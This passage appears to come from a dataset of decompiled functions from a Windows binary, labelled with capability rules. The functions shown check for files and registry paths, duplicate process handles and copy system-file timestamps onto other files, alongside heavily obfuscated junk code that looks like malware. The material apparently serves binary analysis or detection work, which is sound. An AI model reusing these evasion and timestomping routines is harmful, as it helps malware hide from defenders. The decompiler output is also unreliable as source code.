extraout_CH_02;\n    uint extraout_ECX_02;\n    uint extraout_ECX_03;\n    uchar *extraout_ECX_04;\n    uint extraout_ECX_05;\n    uint extraout_ECX_06;\n    uint extraout_ECX_07;\n    ushort extraout_DX;\n    ushort extraout_DX_00;\n    uint32_t extraout_EDX;\n    uint32_t extraout_EDX_00;\n    uint32_t extraout_EDX_01;\n    uint extraout_EDX_02;\n    uint extraout_EDX_03;\n    int32_t unaff_EBX;\n    int32_t iVar12;\n    int32_t *piVar13;\n    int32_t *piVar14;\n    uint32_t unaff_EBP;\n    uint32_t uVar15;\n    uint *unaff_ESI;\n    uint *puVar16;\n    uchar *unaff_EDI;\n    uchar *puVar17;\n    uint uVar18;\n    uint8_t uVar19;\n    uint8_t in_AF;\n    bool bVar20;\n    bool bVar21;\n    char cVar22;\n    char cVar23;\n    uchar uVar24;\n    bool bVar25;\n    ulong uVar26;\n    char cStack00000035;\n    uint in_stack_00000034;\n    ushort uVar27;\n    uchar uVar28;\n    uchar in_stack_ffffffc9;\n    ushort in_stack_ffffffca;\n    uchar in_stack_ffffffcc;\n    uchar in_stack_ffffffcd;\n    ushort in_stack_ffffffce;\n    ushort uVar29;\n    uchar uVar30;\n    uchar uVar31;\n    uchar uVar32;\n    uchar uVar33;\n    uchar uVar34;\n    uchar uVar35;\n    uchar uVar36;\n    uchar in_stack_ffffffd8;\n    uchar in_stack_ffffffd9;\n    uint8_t uVar37;\n    ushort in_stack_ffffffda;\n    ushort uVar38;\n    uchar in_stack_ffffffdc;\n    uchar in_stack_ffffffdd;\n    uchar uVar39;\n    ushort in_stack_ffffffde;\n    ushort uVar40;\n    uchar uVar41;\n    uchar uVar42;\n    unkbyte3 Var43;\n    \n    fcn.00401400(str.Y_vq1, 0x18, 0x42416c, 0x11);\n    fcn.00401400(str.Y_vq1, 0x18, 0x424388, 0xf);\n    fcn.00401400(str.Y_vq1, 0x18, 0x424398, 0x1a);\n    cVar23 = '\\0';\n    cVar22 = '\\0';\n    bVar20 = (((unaff_EBX ^ unaff_ESI) >> 8) - 1U & 0xd) == 0;\n    uVar24 = 0x5d;\n    uVar41 = 0x1f;\n    uVar28 = 0x40;\n    uVar39 = 0;\n    uVar26 = fcn.00401400(str.Y_vq1, 0x18, 0x4243ec, 10);\n    if ((bVar20 || cVar23 != cVar22) || (!bVar20 && cVar23 == cVar22)) {\n        uVar24 = 0xb;\n        uVar41 = 0;\n        uVar28 = 0;\n        uVar39 = 0;\n        in_stack_ffffffdc = 0xf8;\n        in_stack_ffffffdd = 0x43;\n        in_stack_ffffffde = 0x42;\n        in_stack_ffffffd8 = 0x18;\n        in_stack_ffffffd9 = 0;\n        in_stack_ffffffda = 0;\n    }\n    puVar3 = uVar26 + 0x6a39da56;\n    *puVar3 = *puVar3 ^ extraout_CX;\n    uVar15 = unaff_EBP | *(uVar26 + -8);\n    iVar12 = unaff_EBX + 2;\n    pcVar1 = (uVar26 >> 0x20) + 0x19;\n    *pcVar1 = *pcVar1 + (extraout_CX >> 8);\n    fcn.00401400(str.Y_vq1, CONCAT22(in_stack_ffffffda, CONCAT11(in_stack_ffffffd9, in_stack_ffffffd8)), \n                 CONCAT22(in_stack_ffffffde, CONCAT11(in_stack_ffffffdd, in_stack_ffffffdc)), \n                 CONCAT13(uVar39, CONCAT12(uVar28, CONCAT11(uVar41, uVar24))));\n    bVar20 = false;\n    uVar24 = 0xa5;\n    uVar41 = 0x1f;\n    uVar28 = 0x40;\n    uVar39 = 0;\n    fcn.00401400(str.Y_vq1, 0x18, 0x424404, 8);\n    if ((bVar20) || (!bVar20)) {\n        uVar24 = 9;\n        uVar41 = 0;\n        uVar28 = 0;\n        uVar39 = 0;\n    }\n    uVar30 = 0xcf;\n    fcn.00401400(str.Y_vq1, 0x18, 0x42440c, CONCAT13(uVar39, CONCAT12(uVar28, CONCAT11(uVar41, uVar24))));\n    fcn.00401400(str.Y_vq1, 0x18, 0x424418, 9);\n    uVar26 = fcn.00401400(str.Y_vq1, 0x18, 0x424424, 9);\n    bVar20 = false;\n    uVar24 = 0;\n    bVar21 = ((uVar26 >> 0x20 & 0xffffff00 | extraout_CH) & uVar26) == 0;\n    uVar41 = 0xc;\n    uVar28 = 0;\n    uVar27 = 0;\n    uVar6 = fcn.00401400(str.Y_vq1, 0x18, 0x424430, 0xc);\n    if ((bVar21) || (!bVar21)) {\ncode_r0x00402050:\n        fcn.00401400(str.Y_vq1, 0x18, 0x42443c, 3);\n        if ((!uVar24) && (uVar24)) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        uVar30 = 10;\n        in_stack_ffffffcc = 0x40;\n        in_stack_ffffffcd = 0x44;\n        in_stack_ffffffce = 0x42;\n        in_stack_ffffffc9 = 0;\n        in_stack_ffffffca = 0;\n        fcn.00401400(str.Y_vq1, 0x18, 0x424440, 10);\n        uVar41 = iVar12;\n        uVar28 = iVar12 >> 8;\n        uVar27 = iVar12 >> 0x10;\n    }\n    else {\n        iVar12 = unaff_EBX + 3;\n        if (!bVar20 && iVar12 != 0) {\n            in_AF = 9 < (uVar6 & 0xf) | in_AF;\n            piVar2 = (uVar6 & 0xffff0000 | CONCAT11((uVar6 >> 8) + in_AF, uVar6 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n            *piVar2 = *piVar2 - iVar12;\n            uVar24 = SCARRY4(unaff_ESI, 1);\n            unaff_ESI = unaff_ESI + 1;\n            goto code_r0x00402050;\n        }\n    }\n    iVar12 = CONCAT22(uVar27, CONCAT11(uVar28, uVar41));\n    fcn.00401400(str.Y_vq1, 0x18, 0x42444c, 0x40);\n    uVar6 = fcn.00401400(str.Y_vq1, 0x18, 0x42448c, 0xc);\n    uVar24 = uVar15;\n    uVar39 = uVar15 >> 8;\n    uVar40 = uVar15 >> 0x10;\n    uVar37 = unaff_ESI >> 8;\n    uVar38 = unaff_ESI >> 0x10;\n    cVar23 = '\\0';\n    cVar22 = (unaff_EDI & uVar6) < 0;\n    uVar31 = 0x54;\n    iVar7 = fcn.00401400(str.Y_vq1, 0x18, 0x424498, 0xb);\n    if (cVar23 == cVar22) {\n        uVar33 = uVar27;\n        uVar42 = uVar27 >> 8;\n        iVar12 = CONCAT13(uVar42, CONCAT12(uVar33, CONCAT11(uVar28, uVar41)));\n        if (cVar23 == cVar22) goto code_r0x00402109;\n    }\n    else {\ncode_r0x00402109:\n        uVar41 = 4;\n        uVar28 = 0;\n        uVar33 = 0;\n        uVar42 = 0;\n        uVar24 = 0xa4;\n        uVar39 = 0x44;\n        uVar40 = 0x42;\n        uVar37 = 0;\n        uVar38 = 0;\n    }\n    pcVar1 = iVar7 + 0x19;\n    cVar23 = SCARRY1(*pcVar1, extraout_CH_00);\n    *pcVar1 = *pcVar1 + extraout_CH_00;\n    cVar22 = *pcVar1 < '\\0';\n    bVar20 = *pcVar1 == '\\0';\n    uVar32 = 0x1c;\n    uVar34 = 0x21;\n    uVar35 = 0x40;\n    uVar36 = 0;\n    uVar26 = fcn.00401400(str.Y_vq1, CONCAT13(uVar24, CONCAT21(uVar38, uVar37)), \n                          CONCAT13(uVar41, CONCAT21(uVar40, uVar39)), \n                          CONCAT13(uVar31, CONCAT12(uVar42, CONCAT11(uVar33, uVar28))));\n    if ((bVar20 || cVar23 != cVar22) || (!bVar20 && cVar23 == cVar22)) {\n        uVar32 = 4;\n        uVar34 = 0;\n        uVar35 = 0;\n        uVar36 = 0;\n        in_stack_ffffffcd = 0xa8;\n        in_stack_ffffffce = 0x4244;\n        uVar30 = 0;\n        in_stack_ffffffc9 = 0x18;\n        in_stack_ffffffca = 0;\n        in_stack_ffffffcc = 0;\n    }\n    puVar3 = uVar26 + 0x6a39da56;\n    *puVar3 = *puVar3 ^ extraout_CX_00;\n    pcVar1 = (uVar26 >> 0x20) + 0x19;\n    cVar22 = extraout_CX_00 >> 8;\n    bVar20 = SCARRY1(*pcVar1, cVar22);\n    *pcVar1 = *pcVar1 + cVar22;\n    uVar27 = 0x4241;\n    uVar28 = 0;\n    fcn.00401400(str.Y_vq1, CONCAT13(in_stack_ffffffcc, CONCAT21(in_stack_ffffffca, in_stack_ffffffc9)), \n                 CONCAT13(uVar30, CONCAT21(in_stack_ffffffce, in_stack_ffffffcd)), \n                 CONCAT13(uVar36, CONCAT12(uVar35, CONCAT11(uVar34, uVar32))));\n    if ((!bVar20) && (bVar20)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    uVar8 = fcn.00401400(str.Y_vq1, 0x18, 0x4244ac, 0xc);\n    if ((&stack0xffffffb5 < 0xffffffc0) && (&stack0xffffffb5 >= 0xffffffc0)) {\n        out(0xbd, uVar8);\n        return;\n    }\n    iVar5 = fcn.00401400(str.Y_vq1, 0x18, 0x4244b8, 4);\n    uVar19 = (iVar12 + 1 ^ 0x70c5) - iVar5 >> 8 | extraout_CX_01 >> 8;\n    uVar10 = extraout_CX_01;\n    bVar20 = uVar19 < uVar10;\n    bVar25 = SBORROW1(uVar19, uVar10);\n    bVar21 = uVar19 == uVar10;\n    uVar31 = 0;\n    uVar30 = 0xcb;\n    Var43 = 0x424154;\n    fcn.00401400(str.Y_vq1, 0x18, 0x4244bc, 9);\n    uVar15 = extraout_EDX;\n    if (!bVar25) {\n        uVar11 = extraout_EDX & 0xff | (extraout_EDX >> 8) << 8;\n        uVar15 = extraout_EDX & 0xffff0000 | uVar11;\n        if (bVar25) {\n            uVar33 = in(uVar11);\n            *unaff_EDI = uVar33;\n            uVar6 = CONCAT31(iVar12 + 1 >> 8, 0xbc);\n            if (bVar20 || bVar21) goto code_r0x004021e4;\n            uVar15 = fcn.00401400(str.Y_vq1, 0x18, 0x4244e8, CONCAT13(uVar31, Var43));\n            if ((bVar21) || (!bVar21)) {\ncode_r0x0040227f:\n                in_stack_ffffffc9 = 0x54;\n                in_stack_ffffffca = 0x4241;\n                in_stack_ffffffcc = 0;\n                fcn.00401400(str.Y_vq1, 0x18, 0x424508, 0x26);\n            }\n            else {\n                uVar6 = uVar6 + 1;\n                if (!bVar20 && uVar6 != 0) {\n                    in_AF = 9 < (uVar15 & 0xf) | in_AF;\n                    piVar2 = (uVar15 & 0xffff0000 | CONCAT11((uVar15 >> 8) + in_AF, uVar15 + in_AF * '\\x06') & 0xff0f) +\n                             0x2a;\n                    *piVar2 = *piVar2 - uVar6;\n                    unaff_ESI = unaff_ESI + 1;\n                    goto code_r0x0040227f;\n                }\n                *extraout_ECX_00 = *extraout_ECX_00 >> 0x15;\n            }\n            fcn.00401400(str.Y_vq1, 0x18, 0x424530, \n                         CONCAT13(in_stack_ffffffcc, CONCAT21(in_stack_ffffffca, in_stack_ffffffc9)));\n            cVar22 = fcn.00401400(str.Y_vq1, 0x18, 0x424538, 0x19);\n            uVar11 = (extraout_ECX_01 ^ 0x6dd) + 1;\n            uVar24 = 0;\n            bVar20 = (extraout_ECX_01 & 0xffff0000 | uVar11 & 0xff | (uVar11 >> 8) + cVar22 << 8) == extraout_EDX_00;\n            fcn.00401400(str.Y_vq1, 0x18, 0x424554, 0xb);\n            puVar16 = unaff_ESI;\n            if ((!bVar20) && (bVar20)) {\n                puVar16 = unaff_ESI + 1;\n                out(*unaff_ESI, extraout_DX);\n            }\n            uVar26 = fcn.00401400(str.Y_vq1, 0x18, 0x424560, 0x12);\n            puVar9 = uVar26;\n            if (!uVar24 && !bVar20) {\n                uVar6 = uVar6 & 0xffff00ff;\n            }\n            *(unaff_EDI + 1) = *puVar16;\n            pcVar1 = (uVar26 >> 0x20) + 0x19;\n            *pcVar1 = *pcVar1 + extraout_CH_02 + cStack00000035;\n            puVar9[-1] = str.Y_vq1;\n            puVar9[-2] = 0x402383;\n            uVar26 = fcn.00401400(puVar9[-1], *puVar9, puVar9[1], puVar9[2]);\n            puVar9[10] = uVar26;\n            puVar9[9] = extraout_ECX_02;\n            puVar9[8] = uVar26 >> 0x20;\n            puVar9[7] = uVar6 & 0xffff0000 | CONCAT11(0xdf, uVar6);\n            puVar9[6] = puVar9 + 0xb;\n            puVar9[5] = 0x6ae181d1;\n            puVar9[4] = puVar16 + 1;\n            puVar9[3] = unaff_EDI + 5;\n            puVar17 = puVar9[3];\n            uVar8 = puVar9[4];\n            iVar12 = puVar9[5];\n            uVar6 = puVar9[7];\n            puVar9[10] = 2;\n            puVar9[9] = 0x424588;\n            puVar9[8] = 0x18;\n            puVar9[7] = str.Y_vq1;\n            puVar9[6] = 0x4023a8;\n            fcn.00401400(puVar9[7], puVar9[8], puVar9[9], puVar9[10]);\n            puVar9[10] = extraout_ECX_03;\n            *(puVar9 + 0x26) = extraout_DX_00;\n            bVar20 = false;\n            bVar25 = false;\n            bVar21 = ((extraout_ECX_03 >> 8 ^ extraout_AH) + 1 & 0x27) == 0;\n            puVar9[10] = 8;\n            puVar9[9] = 0x42458c;\n            puVar9[8] = 0x18;\n            piVar13 = puVar9 + 7;\n            piVar14 = puVar9 + 7;\n            puVar9[7] = str.Y_vq1;\n            puVar9[6] = 0x4023d2;\n            fcn.00401400(puVar9[7], puVar9[8], puVar9[9], puVar9[10]);\n            cVar22 = extraout_ECX_04 >> 8;\n            uVar15 = extraout_EDX_01;\n            if (bVar25) {\ncode_r0x004023f6:\n                puVar9[6] = 8;\n                puVar9[5] = 0x424594;\n                piVar13 = puVar9 + 4;\n                puVar9[4] = 0x18;\n            }\n            else {\n                *(puVar9 + 0x1a) = extraout_EDX_01;\n                uVar15 = extraout_EDX_01 & 0xffff0000 | *(puVar9 + 0x1a);\n                if (!bVar25) goto code_r0x004023f6;\n                uVar24 = in(*(puVar9 + 0x1a));\n                *puVar17 = uVar24;\n                uVar6 = CONCAT31(uVar6 >> 8, 0xbc);\n                puVar17 = puVar17 + 1;\n                if (!bVar20 && !bVar21) {\n                    *(uVar15 + 0x19) = *(uVar15 + 0x19) + cVar22;\n                    goto code_r0x00402465;\n                }\n            }\n            piVar13[-1] = 0x56;\n            uVar24 = *extraout_ECX_04;\n            *(uVar15 + 0x19) = *(uVar15 + 0x19) + cVar22;\n            piVar13[-2] = str.Y_vq1;\n            piVar13[-3] = 0x402409;\n            fcn.00401400(piVar13[-2], piVar13[-1], *piVar13, piVar13[1]);\n            piVar13[5] = extraout_EDX_02;\n            piVar13[4] = puVar17;\n            uVar18 = piVar13[4];\n            piVar13[5] = 6;\n            piVar13[4] = 0x42459c;\n            piVar13[3] = 0x18;\n            piVar13[2] = str.Y_vq1;\n            piVar13[1] = 0x40243d;\n            uVar26 = fcn.00401400(piVar13[2], piVar13[3], piVar13[4], piVar13[5]);\n            piVar13[5] = uVar26;\n            piVar13[4] = extraout_ECX_05;\n            piVar13[3] = uVar26 >> 0x20;\n            piVar13[2] = uVar6 & 0xffff0000 | CONCAT11(uVar24, uVar6);\n            piVar13[1] = piVar13 + 6;\n            *piVar13 = iVar12 + 1;\n            piVar13[-1] = uVar8;\n            piVar13[-2] = uVar18;\n            uVar6 = piVar13[2];\n            piVar13[5] = 7;\n            piVar13[4] = 0x4245a4;\n            piVar14 = piVar13 + 3;\n            piVar13[3] = 0x18;\ncode_r0x00402465:\n            piVar14[-1] = str.Y_vq1;\n            piVar14[-2] = 0x40246f;\n            fcn.00401400(piVar14[-1], *piVar14, piVar14[1], piVar14[2]);\n            piVar14[2] = extraout_EDX_03;\n            *(piVar14 + 6) = uVar6;\n            uVar11 = *(piVar14 + 6);\n            piVar14[2] = 7;\n            piVar14[1] = 0x4245ac;\n            *piVar14 = 0x18;\n            piVar14[-1] = str.Y_vq1;\n            piVar14[-2] = 0x402494;\n            fcn.00401400(piVar14[-1], *piVar14, piVar14[1], piVar14[2]);\n            piVar14[2] = extraout_ECX_06;\n            piVar14[2] = 6;\n            piVar14[1] = 0x4245b4;\n            *piVar14 = 0x18;\n            piVar14[-1] = str.Y_vq1;\n            piVar14[-2] = 0x4024b7;\n            fcn.00401400(piVar14[-1], *piVar14, piVar14[1], piVar14[2]);\n            piVar14[2] = uVar6 & 0xffff0000 | uVar11;\n            piVar14[2] = 0x25;\n            piVar14[1] = 0x4245bc;\n            *piVar14 = 0x18;\n            piVar14[-1] = str.Y_vq1;\n            piVar14[-2] = 0x4024d2;\n            uVar26 = fcn.00401400(piVar14[-1], *piVar14, piVar14[1], piVar14[2]);\n            piVar14[2] = uVar26;\n            piVar14[1] = extraout_ECX_07;\n            *piVar14 = uVar26 >> 0x20;\n            piVar14[2] = 8;\n            piVar14[1] = 0x4245e4;\n            *piVar14 = 0x18;\n            piVar14[-1] = str.Y_vq1;\n            piVar14[-2] = 0x40250d;\n            fcn.00401400(piVar14[-1], *piVar14, piVar14[1], piVar14[2]);\n            return;\n        }\n    }\n    uVar30 = 0x16;\n    uVar39 = 200;\n    uVar40 = 0x4244;\n    uVar41 = 0;\n    uVar37 = 0x18;\n    uVar38 = 0;\n    uVar24 = 0;\ncode_r0x004021e4:\n    puVar3 = uVar15 + 0x19;\n    uVar19 = CARRY1(*puVar3, extraout_CH_01);\n    *puVar3 = *puVar3 + extraout_CH_01;\n    bVar20 = *puVar3 < '\\0';\n    uVar29 = 0x2202;\n    uVar31 = 0x40;\n    uVar33 = 0;\n    uVar26 = fcn.00401400(str.Y_vq1, uVar37 << 0x18, CONCAT13(uVar39, CONCAT12(uVar24, uVar38)), \n                          CONCAT13(uVar30, CONCAT12(uVar41, uVar40)));\n    if ((bVar20) || (!bVar20)) {\n        uVar29 = 7;\n        uVar31 = 0;\n        uVar33 = 0;\n        in_stack_ffffffca = 0x44e0;\n        in_stack_ffffffcc = 0x42;\n        in_stack_ffffffcd = 0;\n        uVar27 = 0x18;\n        uVar28 = 0;\n        in_stack_ffffffc9 = 0;\n        iVar12 = extraout_ECX;\n    }\n    else {\n        uVar15 = uVar26 + 0x68076a2f;\n        iVar7 = uVar15 + uVar19;\n        iVar12 = extraout_ECX + -1;\n        if (iVar12 != 0 && iVar7 != 0) {\n            pcVar1 = iVar7 + 0x54;\n            *pcVar1 = (*pcVar1 - (iVar12 >> 8)) - (0x97f895d0 < uVar26 || CARRY4(uVar15, uVar19));\n            pcVar4 = swi(1);\n            (*pcVar4)();\n            return;\n        }\n    }\n    pcVar1 = (uVar26 >> 0x20) + 0x19;\n    *pcVar1 = *pcVar1 + (iVar12 >> 8);\n    fcn.00401400(str.Y_vq1, CONCAT13(in_stack_ffffffc9, CONCAT12(uVar28, uVar27)), \n                 CONCAT13(in_stack_ffffffcd, CONCAT12(in_stack_ffffffcc, in_stack_ffffffca)), \n                 CONCAT13(uVar33, CONCAT12(uVar31, uVar29)));\n    return;\n}\n",
        "token_count": 6427
    },
    "00401650": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401650(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *unaff_ESI;\n    bool bVar4;\n    unkbyte6 Var5;\n    uint var_4h;\n    \n    Var5 = fcn.00404720(0x4241d8);\n    bVar4 = Var5 == -1;\n    if (bVar4) {\n        return 0;\n    }\n    if ((!bVar4) && (bVar4)) {\n        out(*unaff_ESI, Var5 >> 0x20);\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)();\n    if (iVar1 != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_8h, iVar1, 0, 0, 0, 2);\n        iVar3 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar2);\n        if (iVar3 != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 284
    },
    "00402870": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool fcn.00402870(void)\n\n{\n    int32_t iVar1;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    iVar1 = fcn.00404500(0x80000002, 0x42444c, 0x42448c, &var_8h, &var_10ch, &var_4h);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(&var_10ch, 0);\n    return iVar1 != -1;\n}\n",
        "token_count": 150
    },
    "00402eb0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00402eb0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004013c0(0x42416c);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 76
    },
    "00402f80": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00402f80(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n    if (iVar1 != -1) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 73
    },
    "00403310": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004033fe) overlaps instruction at (ram,0x004033fc)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x004033e9)\n// WARNING: Removing unreachable block (ram,0x004033fe)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403310(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uint *puVar9;\n    char lpBuffer;\n    uint var_22fh;\n    uchar var_12ch;\n    uint var_12bh;\n    uint var_28h;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint var_14h;\n    int32_t var_4h;\n    \n    var_4h = arg_ch;\n    lpBuffer = '\\0';\n    puVar5 = &var_22fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_12ch = '\\0';\n    puVar5 = &var_12bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    uVar3 = 0xffffffff;\n    pcVar7 = &lpBuffer;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = &var_12ch;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    uVar3 = 0xffffffff;\n    pcVar7 = 0x4241a4;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar7 = &var_12ch;\n    do {\n        pcVar8 = pcVar7;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar8 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar8;\n    } while (cVar1 != '\\0');\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = pcVar8 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&var_12ch, 0, &var_28h);\n    iVar2 = var_4h;\n    if ((arg_ch == -1) && (iVar2 = fcn.004013c0(arg_8h),  iVar2 == -1)) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, &lpCreationTime, &lpLastAccessTime, &var_14h);\n    if (arg_ch == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1239
    },
    "004034e0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040375e) overlaps instruction at (ram,0x0040375c)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x004036fa)\n\nuchar * __cdecl fcn.004034e0(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint8_t uVar2;\n    uchar *puVar3;\n    uint32_t uVar4;\n    int32_t *piVar5;\n    uchar *puVar6;\n    int32_t iVar7;\n    uint extraout_ECX;\n    uint uVar8;\n    uint32_t extraout_ECX_00;\n    uint32_t extraout_ECX_01;\n    uint32_t extraout_ECX_02;\n    uint32_t extraout_ECX_03;\n    uint8_t extraout_DL;\n    uint8_t extraout_DL_00;\n    uint8_t extraout_DL_01;\n    uint8_t extraout_DL_02;\n    char extraout_DH;\n    ushort extraout_DX;\n    uint uVar9;\n    uint32_t *puVar10;\n    uint32_t *puVar11;\n    uint32_t *puVar12;\n    uint32_t uVar13;\n    uchar *puVar14;\n    uint *puVar15;\n    uchar *puVar16;\n    ushort in_ES;\n    uchar uVar17;\n    bool bVar18;\n    bool bVar19;\n    bool bVar20;\n    float10 extraout_ST0;\n    unkuint6 Var21;\n    unkuint6 Var22;\n    uint var_213h;\n    uchar s;\n    uint var_10fh;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar15 = &fcn.004034e0::var_213h;\n    for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar15 = 0;\n        puVar15 = puVar15 + 1;\n    }\n    *puVar15 = 0;\n    *(puVar15 + 2) = 0;\n    s = 0;\n    puVar15 = &fcn.004034e0::var_10fh;\n    for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar15 = 0;\n        puVar15 = puVar15 + 1;\n    }\n    *puVar15 = 0;\n    var_ch = 1;\n    *(puVar15 + 2) = 0;\n    uVar17 = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    puVar3 = (*_sym.imp.MSVCRT.dll_sprintf)(&stack0xfffffeec, 0x418c, *0x10 + -0x218, arg_8h);\n    if ((!uVar17) && (uVar17)) {\n        out(0xbd, puVar3);\n        return puVar3;\n    }\n    fcn.00401000(&fcn.004034e0::var_4h, &fcn.004034e0::var_8h);\n    iVar7 = fcn.00404950(arg_8h, arg_ch, arg_10h, arg_14h, var_4h, var_8h);\n    if (iVar7 == 0) {\n        return NULL;\n    }\n    iVar7 = fcn.00401730(&stack0xfffffeec, var_4h, var_8h);\n    if (iVar7 == 0) {\n        return NULL;\n    }\n    *(puVar15 + 3) = *arg_8h;\n    bVar18 = (POPCOUNT(extraout_DH + -0x36) & 1U) == 0;\n    uVar13 = *(iVar7 + 8);\n    uVar9 = *(iVar7 + 0x10);\n    puVar10 = iVar7 + 0x20;\n    *(iVar7 + 0x1c) = 0x40362f;\n    uVar4 = fcn.00404e20();\n    if (bVar18) {\ncode_r0x0040363b:\n        puVar10 = iVar7 + 0x1c;\n        *(iVar7 + 0x1c) = 0x4241c4;\n        *(iVar7 + 0x18) = 0x403645;\n        piVar5 = fcn.00404720(*(iVar7 + 0x1c));\n    }\n    else {\n        *(iVar7 + 0x1c) = extraout_ECX;\n        uVar8 = *(iVar7 + 0x1c);\n        if (!bVar18) goto code_r0x0040363b;\n        *(uVar4 - 0x3c) = *(uVar4 - 0x3c) + -0x41;\n        uVar2 = uVar4 + (uVar8 >> 8);\n        piVar5 = uVar4 & 0xffffff00 | uVar2;\n        *piVar5 = ROUND(extraout_ST0);\n        *piVar5 = *piVar5 + uVar2;\n    }\n    if (piVar5 == 0xffffffff) {\n        *puVar10 = 0x4241b8;\n        puVar10[-1] = 0x40365e;\n        Var21 = fcn.00404720(*puVar10);\n        if (Var21 == -1) {\n            puVar3 = *(uVar13 + 8);\n            goto code_r0x004036af;\n        }\n        uVar8 = 